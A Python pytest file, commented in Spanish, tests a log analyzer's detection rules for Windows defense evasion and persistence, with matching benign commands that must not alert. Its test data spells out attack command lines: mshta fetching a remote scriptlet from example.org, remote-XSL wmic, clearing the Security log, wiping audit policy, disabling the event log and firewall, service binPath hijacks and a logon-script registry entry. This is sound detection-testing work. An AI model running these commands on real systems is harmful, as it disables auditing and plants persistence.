"""Reglas de evasión de defensas y persistencia por línea de comandos (LOLBins, registro de eventos, firewall, servicios, script de inicio de sesión).

Cada comando de ataque sale de un dataset real de OTRF Security-Datasets (ver docs/VALIDACION.md). Para cada regla hay también pruebas del lado contrario:
el uso normal de esos mismos programas no debe alertar.
"""
import pytest

from backend.analysis import analyze
from backend.parser import load_events
from tests.unit.test_negativos import win

NEW_CMD_RULES = {"cmd_lolbin_proxy", "cmd_log_tamper", "cmd_fw_change", "cmd_service_binpath", "cmd_logon_script"}


def findings(case):
    df, meta = load_events(*case)
    return analyze(df, meta)["findings"]


def cmd_case(cmd):
    return win([dict(eid=4688, user="CORP\\ana", desc="process", cmd=cmd)])


def sysmon13(target, details, image="C:\\Windows\\system32\\reg.exe"):
    desc = (f"Registry value set:\nRuleName: -\nEventType: SetValue\nUtcTime: 2026-11-02 09:00:00.000\nProcessGuid: {{abc}}\nProcessId: 1234\n"
            f"Image: {image}\nTargetObject: {target}\nDetails: {details}\nUser: CORP\\ana")
    return win([dict(eid=13, user="CORP\\ana", desc=desc, src="Microsoft-Windows-Sysmon/Operational")])


# ---------------------------------------------------------------- ataques que deben alertar
ATTACKS = {
    "mshta_javascript": ("mshta.exe  javascript:a=(GetObject('script:https://example.org/x.sct')).Exec();close();", "cmd_lolbin_proxy", "T1218.005", "Alto"),
    "mshta_vbscript": ('mshta  vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc"":close")', "cmd_lolbin_proxy", "T1218.005", "Alto"),
    "mshta_hta_de_usuario": ('"C:\\windows\\system32\\mshta.exe" "C:\\Users\\ana\\AppData\\Roaming\\Startup\\x.hta"', "cmd_lolbin_proxy", "T1218.005", "Alto"),
    "cmstp_inf": ('"C:\\windows\\system32\\cmstp.exe" /s C:\\ProgramData\\uacbypass.inf /au', "cmd_lolbin_proxy", "T1218.003", "Alto"),
    "hh_chm": ('"C:\\windows\\hh.exe" C:\\ProgramData\\payload.chm', "cmd_lolbin_proxy", "T1218.001", "Alto"),
    "control_cpl": ('"C:\\windows\\system32\\control.exe" C:\\ProgramData\\calc.cpl', "cmd_lolbin_proxy", "T1218.002", "Alto"),
    "rundll32_cpl": ('"C:\\windows\\system32\\rundll32.exe" Shell32.dll,Control_RunDLL C:\\ProgramData\\calc.cpl', "cmd_lolbin_proxy", "T1218.002", "Alto"),
    "installutil": ("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /u c:\\ProgramData\\Grunt.dll",
                    "cmd_lolbin_proxy", "T1218.004", "Alto"),
    "register_cimprovider": ('"C:\\Windows\\SysWow64\\Register-CimProvider.exe" -Path C:\\ProgramData\\x.dll', "cmd_lolbin_proxy", "T1218", "Alto"),
    "wmic_xsl_remoto": ('wmic  process list /FORMAT:"https://example.org/wmicscript.xsl"', "cmd_lolbin_proxy", "T1220", "Alto"),
    "wevtutil_limpiar": ("wevtutil cl Security", "cmd_log_tamper", "T1685.005", "Alto"),
    "wevtutil_cambiar_ruta": ('wevtutil  set-log Security /logfilename:"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx"', "cmd_log_tamper", "T1685.001", "Alto"),
    "auditpol_desactivar": ('auditpol.exe /set /user:ana /category:"DS Access" /success:disable', "cmd_log_tamper", "T1685.001", "Alto"),
    "auditpol_borrar": ("auditpol /clear /y", "cmd_log_tamper", "T1685.001", "Alto"),
    "detener_eventlog": ("sc config eventlog start= disabled", "cmd_log_tamper", "T1685.001", "Alto"),
    "powershell_detener_eventlog": ("powershell Stop-Service -Name EventLog -Force", "cmd_log_tamper", "T1685.001", "Alto"),
    "sin_linea_de_comandos": ("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /t REG_DWORD /v ProcessCreationIncludeCmdLine_Enabled /d 0 /f",
                              "cmd_log_tamper", "T1685.001", "Alto"),
    "firewall_abrir_puerto": ('netsh  advfirewall firewall add rule name="x" action=allow dir=in protocol=TCP localport=4501', "cmd_fw_change", "T1686", "Medio"),
    "firewall_apagar": ("netsh advfirewall set allprofiles state off", "cmd_fw_change", "T1686", "Medio"),
    "servicio_con_powershell": ('sc  config Fax binPath= "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c calc"', "cmd_service_binpath", "T1543.003", "Alto"),
    "servicio_en_programdata": ('sc create evil binPath= "C:\\ProgramData\\evil.exe"', "cmd_service_binpath", "T1543.003", "Alto"),
    "servicio_normal": ('sc create AppSvc binPath= "C:\\Program Files\\App\\svc.exe"', "cmd_service_binpath", "T1543.003", "Medio"),
    "logon_script": ("REG.exe  ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\\Users\\ana\\AppData\\Local\\Temp\\art.bat /f", "cmd_logon_script", "T1037.001", "Alto"),
}


@pytest.mark.parametrize("name", ATTACKS)
def test_attack_command_is_detected(name):
    cmd, rule, mitre, sev = ATTACKS[name]
    fs = [f for f in findings(cmd_case(cmd)) if f["rule"] == rule]
    assert len(fs) == 1, f"{rule} no disparó"
    assert mitre in fs[0]["mitre"] and fs[0]["severity"] == sev
    assert not any(t in fs[0]["mitre"] for t in ("T1562.002", "T1562.004", "T1070.001"))   # IDs revocados en ATT&CK v20: se cita el sucesor


# ---------------------------------------------------------------- uso normal que NO debe alertar
NORMAL = {
    "hh_ayuda_de_windows": '"C:\\Windows\\hh.exe" C:\\Windows\\Help\\Windows\\0409\\gettingstarted.chm',
    "control_panel_normal": "control.exe /name Microsoft.System",
    "rundll32_escritorio": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
    "installutil_servicio_instalado": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe C:\\Program Files\\App\\AppService.exe",
    "wmic_local": "wmic process list brief",
    "wmic_xsl_local": 'wmic process list /FORMAT:"C:\\Windows\\System32\\wbem\\en-US\\texttable.xsl"',
    "wevtutil_consultar": "wevtutil qe Security /c:5 /f:text",
    "wevtutil_ampliar_tamano": "wevtutil sl Security /ms:1073741824",
    "auditpol_consultar": 'auditpol /get /category:"Logon/Logoff"',
    "auditpol_habilitar": 'auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable',
    "linea_de_comandos_activada": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /t REG_DWORD /v ProcessCreationIncludeCmdLine_Enabled /d 1 /f",
    "sc_consultar_eventlog": "sc query eventlog",
    "sc_config_sin_binpath": "sc config wuauserv start= auto",
    "firewall_regla_saliente": 'netsh advfirewall firewall add rule name="Web" dir=out action=allow protocol=TCP remoteport=443',
    "firewall_regla_bloqueo": 'netsh advfirewall firewall add rule name="Bloq" dir=in action=block protocol=TCP localport=23',
    "firewall_mostrar": "netsh advfirewall show allprofiles",
    "regsvr32_silencioso": "regsvr32 /s C:\\Windows\\System32\\vbscript.dll",
    "powershell_listar_eventlog": "powershell Get-Service EventLog",
    "reg_run_normal": "reg add HKCU\\Environment /v Path /t REG_SZ /d C:\\Tools /f",
}


@pytest.mark.parametrize("name", NORMAL)
def test_normal_use_of_the_same_programs_stays_quiet(name):
    assert not {f["rule"] for f in findings(cmd_case(NORMAL[name]))} & NEW_CMD_RULES


def test_no_user_in_log_does_not_leave_empty_parentheses_in_title():
    fs = findings(win([dict(eid=4688, user="", desc="process", cmd="netsh advfirewall set allprofiles state off")]))
    t = next(f["title"] for f in fs if f["rule"] == "cmd_fw_change")
    assert "()" not in t


# ---------------------------------------------------------------- registro (Sysmon 13)
def test_event_log_service_disabled_in_registry_is_flagged():
    fs = [f for f in findings(sysmon13("HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Start", "DWORD (0x00000004)")) if f["rule"] == "defense_registry"]
    assert len(fs) == 1 and fs[0]["severity"] == "Alto" and "T1685.001" in fs[0]["mitre"]


def test_command_line_logging_disabled_in_registry_is_flagged():
    fs = [f for f in findings(sysmon13("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\ProcessCreationIncludeCmdLine_Enabled",
                                       "DWORD (0x00000000)")) if f["rule"] == "defense_registry"]
    assert len(fs) == 1


def test_writer_in_user_writable_path_raises_severity():
    fs = [f for f in findings(sysmon13("HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Start", "DWORD (0x00000004)",
                                       image="C:\\Users\\ana\\Downloads\\payload.exe")) if f["rule"] == "defense_registry"]
    assert fs and fs[0]["severity"] == "Crítico"


@pytest.mark.parametrize("target,details", [
    ("HKLM\\System\\CurrentControlSet\\Services\\EventLog\\Start", "DWORD (0x00000002)"),            # automático: estado normal
    ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\ProcessCreationIncludeCmdLine_Enabled", "DWORD (0x00000001)"),   # activarlo es endurecer
    ("HKLM\\System\\CurrentControlSet\\Services\\Spooler\\Start", "DWORD (0x00000004)"),            # otro servicio
])
def test_normal_registry_changes_stay_quiet(target, details):
    assert "defense_registry" not in {f["rule"] for f in findings(sysmon13(target, details))}
